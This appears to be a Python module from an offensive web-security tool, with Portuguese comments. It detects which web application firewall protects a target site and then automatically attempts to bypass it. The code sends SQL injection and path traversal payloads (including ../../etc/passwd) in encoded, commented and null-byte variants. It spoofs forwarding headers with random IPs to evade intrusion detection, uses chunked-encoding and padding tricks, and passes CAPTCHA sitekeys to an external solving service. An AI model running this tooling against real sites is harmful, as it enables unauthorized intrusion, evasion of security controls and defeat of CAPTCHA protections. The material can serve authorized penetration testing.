"""Detector de WAF/IPS com bypass automático."""
import asyncio
import itertools
import json
import random
import re
import time
from dataclasses import dataclass
from typing import Dict, List, Optional
from urllib.parse import quote

import httpx
import structlog

logger = structlog.get_logger(__name__)


@dataclass
class WAFInfo:
    """Informações sobre WAF detectado."""
    name: str
    confidence: int  # 0-100
    indicators: List[str]
    headers: Dict[str, str]


@dataclass
class BypassMethod:
    """Método de bypass testado."""
    technique: str
    success: bool
    payload: str
    response_code: int


@dataclass
class CaptchaBypassResult:
    """Resultado de tentativa de bypass de CAPTCHA."""

    provider: Optional[str]
    success: bool
    token: Optional[str] = None
    detail: Optional[str] = None


class WAFDetector:
    """
    Detecta WAF/IPS e tenta bypass automático.
    
    WAFs Suportados:
    - Cloudflare
    - AWS WAF
    - Akamai
    - Imperva (Incapsula)
    - F5 BIG-IP
    - ModSecurity
    - Sucuri
    - Barracuda
    - Fortinet FortiWeb
    - Citrix NetScaler
    """
    
    # Assinaturas de WAFs
    WAF_SIGNATURES = {
        "Cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
            "content": ["Attention Required", "cloudflare"],
            "status_codes": [403, 503],
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid", "x-amzn-errortype"],
            "content": ["AWS WAF", "RequestId"],
        },
        "Akamai": {
            "headers": ["akamai-x-cache", "akamai-grn"],
            "content": ["Reference #", "akamai"],
        },
        "Imperva": {
            "headers": ["x-cdn", "x-iinfo"],
            "content": ["Incapsula", "_Incapsula_Resource"],
        },
        "F5 BIG-IP": {
            "headers": ["x-cnection", "x-wa-info"],
            "content": ["BigIP", "F5"],
        },
        "ModSecurity": {
            "headers": ["mod_security"],
            "content": ["ModSecurity", "mod_security"],
        },
        "Sucuri": {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "content": ["Sucuri Website Firewall"],
        },
        "Barracuda": {
            "headers": ["barra_counter_session"],
            "content": ["Barracuda Web Application Firewall"],
        },
        "Fortinet": {
            "headers": ["fortigate"],
            "content": ["FortiWeb"],
        },
        "Citrix NetScaler": {
            "headers": ["ns_af", "citrix_ns_id"],
            "content": ["NetScaler"],
        },
    }
    
    # Payloads de teste para bypass
    BYPASS_PAYLOADS = {
        "case_variation": [
            "SeLeCt", "uNiOn", "aNd", "Or",
        ],
        "comment_injection": [
            "SELECT/**/", "UNION/**/ALL/**/SELECT",
            "1'/**/and/**/1=1--",
        ],
        "encoding": [
            "%53%45%4c%45%43%54",  # SELECT URL encoded
            "%2527%2520union",  # ' union double encoded
        ],
        "whitespace": [
            "SELECT\t", "UNION\n", "1'\rand\r1=1",
        ],
        "null_byte": [
            "SELECT%00", "1'%00and%001=1",
        ],
        "unicode": [
            "\u0053\u0045\u004c\u0045\u0043\u0054",  # SELECT
        ],
        "http_parameter_pollution": [
            "id=1&id=2'union select",
        ],
        "double_url_encoding": [
            quote(quote("' OR '1'='1")),
            quote(quote("../../etc/passwd")),
        ],
        "path_obfuscation": [
            "..;/..;/admin",
            "..%2f..%2fadmin",
        ],
        "method_override": [
            "X-HTTP-Method-Override: PUT",
            "X-HTTP-Method: DELETE",
        ],
        "header_noise": [
            "X-Originating-IP: 127.0.0.1",
            "X-Forwarded-Proto: https",
        ],
    }

    RATE_LIMIT_HEADERS = ["retry-after", "x-ratelimit-remaining", "x-ratelimit-reset"]
    RATE_LIMIT_STATUS = {429, 503}

    CAPTCHA_PATTERNS = [
        "captcha", "g-recaptcha", "hcaptcha", "__cf_chl_captcha_tk__",
        "Please verify you are a human", "cloudflare-challenge",
    ]
    
    def __init__(self, target: str, timeout: float = 10.0):
        self.target = target
        self.timeout = timeout
        
        # Normaliza URL
        if not self.target.startswith("http"):
            self.target = f"https://{self.target}"

        try:
            from moriarty.core.config_manager import config_manager

            self.config_manager = config_manager
        except Exception:
            self.config_manager = None

        self.captcha_solver_key = self._get_api_key("captcha_solver")
        self.captcha_solver_url = self._get_api_key("captcha_solver_url")
        self.rate_limit_detected: Optional[Dict[str, str]] = None
        self.captcha_attempt: Optional[CaptchaBypassResult] = None

    async def detect(self) -> Optional[WAFInfo]:
        """Detecta presença de WAF."""
        logger.info("waf.detect.start", target=self.target)
        
        try:
            async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
                # Request normal
                response = await client.get(self.target)
                
                # Request com payload malicioso
                malicious_url = f"{self.target}?id=1' OR '1'='1"
                malicious_response = await client.get(malicious_url)
                
                self._detect_rate_limiting(response, malicious_response)
                await self._detect_captcha(malicious_response)

                # Analisa respostas
                waf_info = self._analyze_responses(response, malicious_response)

                if waf_info:
                    logger.info(
                        "waf.detect.found",
                        waf=waf_info.name,
                        confidence=waf_info.confidence,
                    )
                else:
                    logger.info("waf.detect.none")
                
                return waf_info

        except Exception as e:
            logger.error("waf.detect.error", error=str(e))
            return None

    def _get_api_key(self, service: str) -> Optional[str]:
        if not self.config_manager:
            return None
        try:
            return self.config_manager.get_api_key(service)
        except Exception:
            return None
    
    def _analyze_responses(
        self,
        normal: httpx.Response,
        malicious: httpx.Response,
    ) -> Optional[WAFInfo]:
        """Analisa respostas para detectar WAF."""
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            confidence = 0
            indicators = []
            detected_headers = {}
            
            # Verifica headers
            for header in signatures.get("headers", []):
                if header.lower() in [h.lower() for h in malicious.headers.keys()]:
                    confidence += 30
                    indicators.append(f"Header: {header}")
                    detected_headers[header] = malicious.headers.get(header, "")
            
            # Verifica conteúdo
            for content_sig in signatures.get("content", []):
                if content_sig.lower() in malicious.text.lower():
                    confidence += 25
                    indicators.append(f"Content: {content_sig}")
            
            # Verifica status codes
            if "status_codes" in signatures:
                if malicious.status_code in signatures["status_codes"]:
                    confidence += 20
                    indicators.append(f"Status: {malicious.status_code}")
            
            # Verifica se houve bloqueio
            if normal.status_code == 200 and malicious.status_code >= 400:
                confidence += 25
                indicators.append("Request malicioso bloqueado")
            
            # Se confiança >= 50%, considera detectado
            if confidence >= 50:
                return WAFInfo(
                    name=waf_name,
                    confidence=min(confidence, 100),
                    indicators=indicators,
                    headers=detected_headers,
                )
        
        return None

    def _detect_rate_limiting(self, normal: httpx.Response, malicious: httpx.Response) -> None:
        """Identifica indícios de rate limiting."""
        indicators: Dict[str, str] = {}

        if malicious.status_code in self.RATE_LIMIT_STATUS and normal.status_code not in self.RATE_LIMIT_STATUS:
            indicators["status"] = str(malicious.status_code)

        for header in self.RATE_LIMIT_HEADERS:
            value = malicious.headers.get(header)
            if value:
                indicators[header] = value

        if "too many requests" in malicious.text.lower():
            indicators["body"] = "too many requests"

        if indicators:
            self.rate_limit_detected = indicators
            logger.info("waf.detect.rate_limit", indicators=indicators)

    async def _detect_captcha(self, response: httpx.Response) -> None:
        """Detecta e tenta contornar desafios CAPTCHA."""
        content_lower = response.text.lower()
        if not any(pattern in content_lower for pattern in self.CAPTCHA_PATTERNS):
            return

        logger.info("waf.captcha.detected")

        if not self.captcha_solver_key or not self.captcha_solver_url:
            self.captcha_attempt = CaptchaBypassResult(
                provider=None,
                success=False,
                detail="captcha solver not configured",
            )
            return

        attempt = await self._attempt_captcha_bypass(response)
        self.captcha_attempt = attempt
        if attempt.success:
            logger.info("waf.captcha.bypass", provider=attempt.provider)
        else:
            logger.warning("waf.captcha.bypass_failed", detail=attempt.detail)

    async def _attempt_captcha_bypass(self, response: httpx.Response) -> CaptchaBypassResult:
        """Tenta resolver CAPTCHA via serviço configurado."""
        sitekey = self._extract_captcha_sitekey(response.text)
        if not sitekey:
            return CaptchaBypassResult(
                provider=self.captcha_solver_url,
                success=False,
                detail="sitekey not found",
            )

        payload = {
            "key": self.captcha_solver_key,
            "sitekey": sitekey,
            "url": self.target,
        }

        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                solver_response = await client.post(self.captcha_solver_url, json=payload)

            if solver_response.status_code >= 400:
                return CaptchaBypassResult(
                    provider=self.captcha_solver_url,
                    success=False,
                    detail=f"solver http {solver_response.status_code}",
                )

            data = solver_response.json()
            token = data.get("token") or data.get("solution") or data.get("answer")
            success = bool(token)
            detail = data.get("status") or data.get("message")

            return CaptchaBypassResult(
                provider=self.captcha_solver_url,
                success=success,
                token=token,
                detail=detail,
            )

        except Exception as exc:  # pragma: no cover - depende de serviço externo
            return CaptchaBypassResult(
                provider=self.captcha_solver_url,
                success=False,
                detail=str(exc),
            )

    def _extract_captcha_sitekey(self, content: str) -> Optional[str]:
        match = re.search(r"data-sitekey=\"([^\"]+)\"", content)
        if match:
            return match.group(1)
        match = re.search(r"['\"]sitekey['\"].*?:.*?['\"]([^'\"]+)['\"]", content)
        if match:
            return match.group(1)
        return None

    def _build_ids_evasion_headers(self) -> Dict[str, str]:
        """Constrói headers para evasão de IDS/IPS."""
        random_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        return {
            "X-Forwarded-For": random_ip,
            "X-Originating-IP": random_ip,
            "X-Forwarded-Host": "localhost",
            "Forwarded": f"for={random_ip}; proto=https",
            "X-Requested-With": random.choice(["XMLHttpRequest", "Fetch"]),
        }

    async def _execute_bypass(
        self,
        client: httpx.AsyncClient,
        technique: str,
        payload: str,
    ) -> Optional[BypassMethod]:
        try:
            headers = self._build_ids_evasion_headers()
            response: Optional[httpx.Response] = None

            if technique == "http_parameter_pollution":
                test_url = f"{self.target}?{payload}"
                response = await client.get(test_url, headers=headers)
            elif technique == "path_obfuscation":
                test_url = f"{self.target.rstrip('/')}/{payload.lstrip('/')}"
                response = await client.get(test_url, headers=headers)
            elif technique == "method_override":
                header_name, header_value = payload.split(":", 1)
                headers[header_name.strip()] = header_value.strip()
                response = await client.post(self.target, headers=headers, data="id=1")
            elif technique == "header_noise":
                name, value = payload.split(":", 1)
                headers[name.strip()] = value.strip()
                response = await client.get(self.target, headers=headers)
            else:
                parameter = "test"
                encoded_payload = payload
                if technique == "double_url_encoding":
                    encoded_payload = payload
                elif technique == "encoding":
                    encoded_payload = payload
                elif technique == "unicode":
                    encoded_payload = payload
                test_url = f"{self.target}?{parameter}={encoded_payload}"
                response = await client.get(test_url, headers=headers)

            if response is None:
                return None

            success = response.status_code not in {403, 406, 503}
            result = BypassMethod(
                technique=technique,
                success=success,
                payload=payload,
                response_code=response.status_code,
            )

            if success:
                logger.info(
                    "waf.bypass.success",
                    technique=technique,
                    payload=payload[:60],
                    status=response.status_code,
                )
            else:
                logger.debug(
                    "waf.bypass.blocked",
                    technique=technique,
                    status=response.status_code,
                )

            return result

        except Exception as exc:
            logger.debug("waf.bypass.error", technique=technique, error=str(exc))
            return None

    async def _run_advanced_bypass(self, client: httpx.AsyncClient) -> List[BypassMethod]:
        """Executa técnicas de bypass avançadas (chunked, padding etc.)."""
        results: List[BypassMethod] = []

        # Chunked encoding
        async def chunked_body():
            for chunk in [b"id=1", b"&value=payload"]:
                yield chunk

        try:
            response = await client.post(
                self.target,
                headers={
                    "Transfer-Encoding": "chunked",
                    **self._build_ids_evasion_headers(),
                },
                content=chunked_body(),
            )
            success = response.status_code not in {403, 406, 503}
            results.append(
                BypassMethod(
                    technique="chunked_encoding",
                    success=success,
                    payload="chunked",
                    response_code=response.status_code,
                )
            )
        except Exception as exc:  # pragma: no cover - depende do backend aceitar chunked
            logger.debug("waf.bypass.chunked_error", error=str(exc))

        # Method tunneling using X-Original-Method
        try:
            headers = self._build_ids_evasion_headers()
            headers.update({
                "X-Original-Method": "DELETE",
                "X-HTTP-Method-Override": "PUT",
            })
            response = await client.post(self.target, headers=headers, data="id=1")
            success = response.status_code not in {403, 406, 503}
            results.append(
                BypassMethod(
                    technique="method_tunneling",
                    success=success,
                    payload="X-Original-Method",
                    response_code=response.status_code,
                )
            )
        except Exception as exc:
            logger.debug("waf.bypass.method_tunnel_error", error=str(exc))

        # Padding large headers
        try:
            padding = "A" * 2048
            headers = self._build_ids_evasion_headers()
            headers["X-Padding"] = padding
            response = await client.get(self.target, headers=headers)
            success = response.status_code not in {403, 406, 503}
            results.append(
                BypassMethod(
                    technique="header_padding",
                    success=success,
                    payload="2048-bytes",
                    response_code=response.status_code,
                )
            )
        except Exception as exc:
            logger.debug("waf.bypass.padding_error", error=str(exc))

        return results

    async def _run_bypass_chains(self, client: httpx.AsyncClient) -> List[BypassMethod]:
        """Executa cadeias de técnicas combinadas."""
        chain_candidates = [
            ("encoding", "comment_injection"),
            ("case_variation", "unicode"),
            ("encoding", "null_byte"),
        ]

        results: List[BypassMethod] = []
        base_payload = "SELECT 1 FROM users WHERE '1'='1'"

        for chain in chain_candidates:
            payload = base_payload
            for technique in chain:
                payload = self._apply_transform(technique, payload)

            test_url = f"{self.target}?chain={quote(payload)}"
            try:
                response = await client.get(test_url, headers=self._build_ids_evasion_headers())
                success = response.status_code not in {403, 406, 503}
                results.append(
                    BypassMethod(
                        technique="+".join(chain),
                        success=success,
                        payload=payload[:80],
                        response_code=response.status_code,
                    )
                )
            except Exception as exc:
                logger.debug("waf.bypass.chain_error", chain="+".join(chain), error=str(exc))

        return results

    def _apply_transform(self, technique: str, payload: str) -> str:
        """Aplica transformação ao payload base."""
        if technique == "encoding":
            return quote(payload, safe="")
        if technique == "comment_injection":
            return payload.replace(" ", "/**/")
        if technique == "case_variation":
            return "".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in payload
            )
        if technique == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        if technique == "null_byte":
            return payload + "%00"
        return payload
    async def attempt_bypass(self) -> List[BypassMethod]:
        """Tenta bypass automático do WAF."""
        logger.info("waf.bypass.start", target=self.target)
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
            # Testa cada técnica de bypass
            for technique, payloads in self.BYPASS_PAYLOADS.items():
                for payload in payloads:
                    result = await self._execute_bypass(client, technique, payload)
                    if result:
                        results.append(result)
                    await asyncio.sleep(0.2)

            results.extend(await self._run_advanced_bypass(client))
            results.extend(await self._run_bypass_chains(client))

        successful = [r for r in results if r.success]
        logger.info("waf.bypass.complete", total=len(results), successful=len(successful))
        
        return results


__all__ = ["WAFDetector", "WAFInfo", "BypassMethod", "CaptchaBypassResult"]
